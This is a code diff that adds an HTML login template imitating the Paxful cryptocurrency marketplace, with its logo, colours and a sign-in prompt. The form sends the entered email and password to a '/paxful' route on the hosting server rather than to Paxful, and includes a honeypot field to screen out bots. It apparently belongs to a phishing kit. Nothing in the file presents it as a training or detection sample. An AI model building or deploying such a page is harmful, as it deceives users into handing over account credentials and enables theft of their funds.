@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Paxful Login</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    .neon-green {
+      background-color: #d2ff2f;
+      color: black;
+    }
+    .notification {
+      position: fixed;
+      top: 10%;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #ff0000;
+      color: white;
+      padding: 15px;
+      border-radius: 8px;
+      display: none;
+      z-index: 50;
+    }
+    .honeypot {
+      display: none;
+    }
+  </style>
+</head>
+<body class="bg-black text-white min-h-screen flex items-center justify-center px-4">
+
+  <div class="flex flex-col md:flex-row w-full max-w-6xl bg-[#0d0d0d] rounded-2xl overflow-hidden shadow-lg">
+
+    <div class="md:w-1/2 w-full px-6 py-12 flex flex-col justify-center">
+      <div class="mb-8 text-center">
+        <img src="{{ url_for('static', filename='assets/paxful.118f7bfed54f644bd2ec1ab7809b94620243dd4222c376d70e7921967d6c8eb6.jpg') }}" alt="Paxful Logo" class="h-10 mx-auto">
+
+      </div>
+      <h2 class="text-3xl font-semibold mb-2 text-center">Paxful Login</h2>
+      <p class="text-gray-400 mb-6 text-center">Please log in to continue</p>
+
+      <form class="space-y-5 w-full" method="POST" action="/paxful">
+        <div>
+          <label class="text-sm font-medium">Email Address <span class="text-red-500">*</span></label>
+          <input type="email" name="username" placeholder="Enter your email" 
+            class="w-full mt-1 px-4 py-3 rounded-2xl bg-[#1a1a1a] text-white border border-[#1a1a1a] focus:outline-none focus:ring-2 focus:ring-lime-400" 
+            required />
+        </div>
+
+        <div>
+          <label class="text-sm font-medium">Password <span class="text-red-500">*</span></label>
+          <div class="relative">
+            <input type="password" name="password" placeholder="Password" 
+              class="w-full mt-1 px-4 py-3 pr-10 rounded-2xl bg-[#1a1a1a] text-white border border-[#1a1a1a] focus:outline-none focus:ring-2 focus:ring-lime-400"
+              required />
+            <span class="absolute inset-y-0 right-3 flex items-center cursor-pointer">👁️</span>
+          </div>
+        </div>
+
+        <div class="flex justify-end">
+          <a href="#" class="text-sm text-gray-400 underline">Forgot password?</a>
+        </div>
+
+        <div class="honeypot">
+          <label>Leave this field empty</label>
+          <input type="text" name="honeypot" autocomplete="off" />
+        </div>
+
+        <button type="submit" class="w-full neon-green font-semibold py-3 rounded-full hover:brightness-110 transition">Sign In</button>
+      </form>
+    </div>
+
+    <div class="md:w-1/2 w-full hidden md:flex items-center justify-center bg-[#111] p-6">
+      <img src="{{ url_for('static', filename='assets/Screenshot_2025-04-15_102646.png') }}" alt="Welcome Graphic" class="w-full max-w-sm object-contain" />
+
+    </div>
+  </div>
+
+  <div class="notification" id="notification"></div>
+
+  <script>
+    const passwordInputs = document.querySelectorAll('input[type="password"]');
+    const eyeIcons = document.querySelectorAll('span.flex.items-center');
+
+    eyeIcons.forEach((eyeIcon, index) => {
+      eyeIcon.addEventListener('click', function() {
+        const input = passwordInputs[index];
+        const type = input.type === 'password' ? 'text' : 'password';
+        input.type = type;
+        eyeIcon.textContent = type === 'password' ? '👁️' : '🙈';
+      });
+    });
+  </script>
+</body>
+</html>
